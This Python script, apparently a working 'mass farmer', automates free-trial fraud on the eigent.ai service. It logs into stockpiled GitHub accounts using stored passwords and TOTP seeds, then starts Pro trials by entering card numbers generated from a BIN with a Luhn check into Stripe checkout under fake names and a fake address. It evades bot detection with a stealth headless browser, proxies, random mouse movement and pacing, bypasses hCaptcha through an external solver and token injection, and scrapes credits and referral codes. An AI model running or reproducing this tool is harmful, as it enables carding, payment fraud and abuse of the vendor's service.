# Eigent Pro trial MASS FARMER — E2E: GH OAuth -> pricing -> Pro trial -> Stripe (chkr BIN card,
# USA/10001) -> hCaptcha (auto-pass or sidecar solve+inject) -> dashboard scrape -> bank jsonl.
# Usage: python eigent_farm.py N [start_idx]   (N accounts sequentially, pace 75-140s)
# Env: SIDE (default http://127.0.0.1:8877/solve), PROXY=http://user:pass@host:port (optional)
import os, sys, json, time, random, hmac, hashlib, struct, base64, re, urllib.request

ROOT = r"C:\Users\User\tmp\eigent"
BANK = os.path.join(ROOT, "eigent_bank.jsonl")
USED = os.path.join(ROOT, "eigent_used_gh.txt")
FLOG = os.path.join(ROOT, "farm.log")
GH = os.environ.get("GH_ACCOUNTS", r"C:\Users\User\tmp\gh_accounts.json")
SIDE = os.environ.get("SIDE", "http://127.0.0.1:8878/solve")
BIN = "5424322339"
NAMES = ["John Miller", "James Smith", "Robert Johnson", "Michael Brown", "William Jones",
         "David Garcia", "Richard Martinez", "Charles Lopez", "Thomas Walker", "Chris Hall"]
KNOWN_SITEKEYS = ["24ed0064-62cf-4d42-9960-5dd1a41d4e29", "ec637546-e9b8-447a-ab81-b5fb6d228ab8"]

PROXY = None
_p = os.environ.get("PROXY", "").strip()
if _p:
    m = re.match(r"https?://([^:/@]+):([^@]+)@(.+)", _p)
    if m:
        PROXY = {"server": "http://" + m.group(3), "username": m.group(1), "password": m.group(2)}

def log(msg):
    line = "[" + time.strftime("%m-%d %H:%M:%S") + "] " + str(msg)
    print(line, flush=True)
    with open(FLOG, "a", encoding="utf-8") as f:
        f.write(line + "\n")

def luhn_ok(pan):
    s = 0; d = False
    for ch in reversed(pan):
        n = int(ch)
        if d:
            n *= 2
            if n > 9: n -= 9
        s += n; d = not d
    return s % 10 == 0

def gen_card():
    b = BIN + "x" * (16 - len(BIN))
    for _ in range(500):
        p = "".join(str(random.randint(0, 9)) if c == "x" else c for c in b)
        if luhn_ok(p):
            mm = random.choice([1, 2, 3, 5, 8, 11])
            yy = random.randint(28, 31)
            cvv = "".join(str(random.randint(0, 9)) for _ in range(3))
            return {"pan": p, "mon": str(mm).zfill(2), "yr": str(yy), "cvv": cvv}
    raise RuntimeError("luhn gen fail")

def totp_now(secret):
    secret = str(secret).replace(" ", "").upper()
    pad = "=" * ((8 - len(secret) % 8) % 8)
    key = base64.b32decode(secret + pad)
    h = hmac.new(key, struct.pack(">Q", int(time.time()) // 30), hashlib.sha1).digest()
    o = h[-1] & 0x0F
    return str((struct.unpack(">I", h[o:o+4])[0] & 0x7FFFFFFF) % 1000000).zfill(6)

def sidecar_solve(sitekey, url):
    payload = {"type": "hcaptcha", "sitekey": sitekey, "url": url, "timeout_s": 240}
    rq = urllib.request.Request(SIDE, data=json.dumps(payload).encode(),
                                headers={"Content-Type": "application/json"})
    try:
        r = json.load(urllib.request.urlopen(rq, timeout=280))
        tok = r.get("token") or ""
        log("SOLVER solved=" + str(r.get("solved")) + " token_len=" + str(len(tok)))
        return tok
    except Exception as e:
        log("SOLVER ERR " + str(e)[:120])
        return ""

def inject_token(pg, tok):
    n = 0
    for fr in pg.frames:
        try:
            r = fr.evaluate("(t) => { let c=0; if(window.hcaptcha && window.hcaptcha.setResponse){ try{window.hcaptcha.setResponse(t); c++;}catch(e){} } document.querySelectorAll('textarea').forEach(e=>{ if(/captcha/i.test(e.name||'')){e.value=t;c++;} }); return c; }", tok)
            n += r or 0
        except Exception:
            pass
    try:
        for fr in [pg.main_frame] + list(pg.frames):
            try:
                fr.evaluate("(t) => { window.postMessage({source:'hcaptcha', type:'captcha-success', token:*** '*'); document.dispatchEvent(new CustomEvent('hcaptcha-success',{detail:{token:*** })); }", tok)
            except Exception:
                pass
    except Exception:
        pass
    log("INJECTED n=" + str(n))
    return n

def find_sitekey(pg, captured):
    if captured:
        return captured[-1]
    for fr in pg.frames:
        try:
            m = re.search(r"sitekey=([0-9a-f-]{36})", fr.url)
            if m: return m.group(1)
        except Exception:
            pass
    return KNOWN_SITEKEYS[0]

def load_used():
    if not os.path.exists(USED): return set()
    return set(int(x.strip()) for x in open(USED).read().split() if x.strip().isdigit())

def mark_used(i):
    with open(USED, "a", encoding="utf-8") as f:
        f.write(str(i) + "\n")

def bank(rec):
    with open(BANK, "a", encoding="utf-8") as f:
        f.write(json.dumps(rec) + "\n")

def pick_accounts(n, start):
    accts = json.load(open(GH, encoding="utf-8"))
    used = load_used()
    out = []
    i = start
    while i < len(accts) and len(out) < n:
        a = accts[i]
        seed = a.get("totp") or a.get("totp_secret") or a.get("2fa") or a.get("seed_2fa")
        if i not in used and a.get("password") and seed and (a.get("login") or a.get("username")):
            out.append((i, a, seed))
        i += 1
    return out

def run_account(idx, acc, seed):
    from camoufox.sync_api import Camoufox
    login = acc.get("login") or acc.get("username")
    card = gen_card()
    holder = random.choice(NAMES)
    res = {"idx": idx, "gh_login": login, "date": time.strftime("%Y-%m-%d %H:%M"),
           "card_tail": card["pan"][-4:], "exp": card["mon"] + "/" + card["yr"]}
    log("=== ACC idx=" + str(idx) + " login=" + login[:14] + " card=*" + card["pan"][-4:])
    captured = []
    with Camoufox(headless=True, proxy=PROXY) as br:
        pg = br.new_page()
        pg.set_default_timeout(120000)
        def on_req(rq):
            try:
                for m in re.findall(r"sitekey=([0-9a-f-]{36})", rq.url):
                    if m not in captured: captured.append(m)
            except Exception:
                pass
        pg.on("request", on_req)
        # STEP 1: signin -> GitHub OAuth
        pg.goto("https://www.eigent.ai/signin", timeout=120000, wait_until="domcontentloaded")
        pg.wait_for_timeout(6000)
        pg.evaluate("() => { const b=Array.from(document.querySelectorAll('button,a')).find(x=>/Continue with GitHub/i.test(x.textContent||'')); if(b) b.click(); }")
        pg.wait_for_timeout(9000)
        if "github.com" not in pg.url:
            res["result"] = "NO_GH_BTN"; res["url"] = pg.url[:100]
            bank(res); mark_used(idx); return res
        if "github.com/login" in pg.url:
            pg.fill("#login_field", login); pg.wait_for_timeout(random.randint(600, 1200))
            pg.fill("#password", acc["password"]); pg.wait_for_timeout(random.randint(600, 1200))
            pg.evaluate("() => document.querySelector('#login_field').closest('form').submit()")
            pg.wait_for_timeout(9000)
            if pg.query_selector("#app_totp"):
                pg.fill("#app_totp", totp_now(seed))
                pg.wait_for_timeout(700)
                pg.evaluate("""() => { const b=Array.from(document.querySelectorAll('button')).find(x=>x.offsetWidth>0 && /verify/i.test(x.textContent||'')); if(b) b.click(); else { const f=document.querySelector('#app_totp').closest('form'); if(f) f.submit(); } }""")
                pg.wait_for_timeout(9000)
            if "github.com/login" in pg.url and "oauth" not in pg.url:
                res["result"] = "GH_LOGIN_FAIL"; res["url"] = pg.url[:100]
                try: res["body"] = pg.inner_text("body")[:150].replace("\n", " ")
                except Exception: pass
                bank(res); mark_used(idx); return res
        if "oauth/authorize" in pg.url:
            btn = pg.query_selector("button[name=authorize], #js-oauth-authorize-btn, button[type=submit]")
            if btn:
                bb = btn.bounding_box()
                if bb: pg.mouse.click(bb["x"] + bb["width"] / 2, bb["y"] + bb["height"] / 2)
                else: btn.click()
            pg.wait_for_timeout(10000)
        # STEP 2: pricing -> Pro trial
        pg.goto("https://www.eigent.ai/pricing", timeout=120000, wait_until="domcontentloaded")
        pg.wait_for_timeout(8000)
        boxes = pg.evaluate("""() => Array.from(document.querySelectorAll('button,a')).filter(x=>/Start 7 day free trial/i.test(x.textContent||'') && x.offsetWidth>0).map(b=>{b.scrollIntoView({block:'center'}); const r=b.getBoundingClientRect(); return {x:r.x+r.width/2, y:r.y+r.height/2};})""")
        if not boxes:
            res["result"] = "NO_TRIAL_BTN"
            bank(res); mark_used(idx); return res
        b = boxes[1] if len(boxes) > 1 else boxes[0]
        pg.wait_for_timeout(1200)
        pg.mouse.click(b["x"], b["y"])
        pg.wait_for_timeout(12000)
        if "checkout.stripe.com" not in pg.url:
            res["result"] = "NO_CHECKOUT"; res["url"] = pg.url[:100]
            bank(res); mark_used(idx); return res
        res["checkout"] = pg.url[:80]
        # STEP 3: fill Stripe
        pg.wait_for_selector("#cardNumber", timeout=60000)
        pg.click("#cardNumber"); pg.fill("#cardNumber", card["pan"]); pg.wait_for_timeout(random.randint(700, 1300))
        pg.click("#cardExpiry"); pg.fill("#cardExpiry", card["mon"] + card["yr"]); pg.wait_for_timeout(random.randint(500, 1000))
        pg.click("#cardCvc"); pg.fill("#cardCvc", card["cvv"]); pg.wait_for_timeout(random.randint(400, 900))
        for sel in ("#nameOnCard", "#billingName"):
            try:
                if pg.query_selector(sel): pg.fill(sel, holder)
            except Exception: pass
        # country USA: select or combobox fallback
        us_ok = False
        try:
            el = pg.query_selector("#billingCountry,select[name=billingCountry]")
            if el:
                el.select_option(label="United States"); us_ok = True
        except Exception: pass
        if not us_ok:
            try:
                cb = pg.query_selector("#billingCountry, [aria-label*='Country']")
                if cb:
                    cb.click(); pg.wait_for_timeout(800)
                    pg.keyboard.type("United States", delay=35); pg.wait_for_timeout(900)
                    pg.keyboard.press("ArrowDown"); pg.wait_for_timeout(300)
                    pg.keyboard.press("Enter"); us_ok = True
            except Exception: pass
        pg.wait_for_timeout(900)
        try:
            if pg.query_selector("#billingPostalCode"): pg.fill("#billingPostalCode", "10001")
        except Exception: pass
        for sel, val in (("#billingAddressLine1", "350 5th Avenue"), ("#billingLocality", "New York"),
                         ("#billingAdministrativeArea", "NY")):
            try:
                if pg.query_selector(sel): pg.fill(sel, val)
            except Exception: pass
        pg.wait_for_timeout(random.randint(1500, 3000))
        for _ in range(6):
            pg.mouse.move(random.randint(150, 900), random.randint(120, 550)); pg.wait_for_timeout(random.randint(150, 450))
        # STEP 4: submit
        btn = pg.query_selector("button[type=submit]")
        bb = btn.bounding_box() if btn else None
        submit_ts = time.time()
        if bb: pg.mouse.click(bb["x"] + bb["width"] / 2, bb["y"] + bb["height"] / 2)
        else: pg.evaluate("() => { const b=document.querySelector('button[type=submit]'); if(b) b.click(); }")
        log("SUBMITTED")
        # STEP 5: monitor
        solved = False
        solve_tries = 0
        next_solve_ts = 0.0
        deadline = time.time() + 600
        last_diag = ""
        while time.time() < deadline:
            url = pg.url
            body = ""
            try: body = pg.inner_text("body")
            except Exception: pass
            low = body.lower()
            if any(k in low for k in ("payment successful", "your free trial runs until", "trial started", "confirmation succeeded")):
                res["result"] = "SUCCESS"; res["url"] = url[:100]
                log("SUCCESS " + url[:80])
                break
            if any(k in low for k in ("payment failed", "your card was declined", "card_declined", "fraudulent", "incorrect_cvc", "insufficient", "expired_card", "cannot be used", "try another card", "try a different")):
                reason = next((k for k in ("incorrect_cvc", "card_declined", "fraudulent", "insufficient", "expired_card", "processing_error") if k in low), "generic")
                res["result"] = "FAILED"; res["reason"] = reason; res["body"] = body[:250].replace("\n", " ")
                log("FAILED " + reason)
                break
            if any(k in low for k in ("one-time code", "verification code", "authenticate", "3d secure", "confirm your card")) or "challenge" in url.lower():
                res["result"] = "3DS"; res["url"] = url[:100]
                log("3DS " + url[:80])
                break
            if url.startswith("https://www.eigent.ai") and "pricing" not in url and "signin" not in url:
                res["result"] = "NAV_OK"; res["url"] = url[:100]
                log("NAV_OK " + url[:80])
                break
            diag = ""
            try:
                diag = pg.evaluate("() => { const b=document.querySelector('button[type=submit]'); return b ? (b.disabled?'dis':'en')+':'+(b.textContent||'').trim().slice(0,40) : 'nobtn'; }")
            except Exception: pass
            if diag and diag != last_diag:
                last_diag = diag; log("DIAG " + diag)
            # stuck -> sidecar solve + inject (also fires on visible checkbox prompt)
            need_solve = (solve_tries < 2) and (time.time() >= next_solve_ts) and (time.time() - submit_ts > 75 or "one more step" in low or "select the checkbox" in low or "are you a human" in low)
            if need_solve:
                sk = find_sitekey(pg, captured)
                solve_tries += 1
                log("STUCK/CHECKBOX try" + str(solve_tries) + " sitekey=" + sk[:12] + " -> sidecar")
                tok = sidecar_solve(sk, url)
                next_solve_ts = time.time() + 45
                if tok:
                    inject_token(pg, tok)
                    solved = True
            pg.wait_for_timeout(2500)
        else:
            res["result"] = "TIMEOUT"; res["solved"] = solved
        # STEP 6: dashboard scrape on success
        if res.get("result") in ("SUCCESS", "NAV_OK"):
            try:
                pg.goto("https://www.eigent.ai/", timeout=60000, wait_until="domcontentloaded")
                pg.wait_for_timeout(7000)
                txt = pg.inner_text("body")
                m = re.search(r"([\d,]+)\s*\n?\s*Spendable", txt)
                if m: res["credits"] = m.group(1)
                m2 = re.search(r"\b([A-Z0-9]{10,16})\b", txt)
                inv = pg.evaluate("() => { const b=Array.from(document.querySelectorAll('button')).find(x=>/^[A-Z0-9]{10,16}$/.test((x.textContent||'').trim())); return b?(x=>x.textContent.trim())(b):''; }")
                if inv: res["ref_code"] = inv
                res["dash_url"] = pg.url[:100]
            except Exception as e:
                log("DASH ERR " + str(e)[:80])
    if "result" not in res: res["result"] = "UNKNOWN"
    bank(res); mark_used(idx)
    log("=== DONE idx=" + str(idx) + " -> " + res["result"])
    return res

def main():
    n = int(sys.argv[1]) if len(sys.argv) > 1 else 1
    start = int(sys.argv[2]) if len(sys.argv) > 2 else 0
    picks = pick_accounts(n, start)
    log("FARM START n=" + str(len(picks)) + " proxy=" + str(bool(PROXY)))
    stats = {}
    for k, (idx, acc, seed) in enumerate(picks):
        try:
            r = run_account(idx, acc, seed)
            stats[r.get("result", "ERR")] = stats.get(r.get("result", "ERR"), 0) + 1
        except Exception as e:
            log("ACC EXC idx=" + str(idx) + " " + str(e)[:150])
            bank({"idx": idx, "result": "EXC", "err": str(e)[:200]})
            mark_used(idx)
            stats["EXC"] = stats.get("EXC", 0) + 1
        if k < len(picks) - 1:
            pace = random.randint(75, 140)
            log("PACE " + str(pace) + "s")
            time.sleep(pace)
    log("FARM END stats=" + json.dumps(stats))

if __name__ == "__main__":
    main()
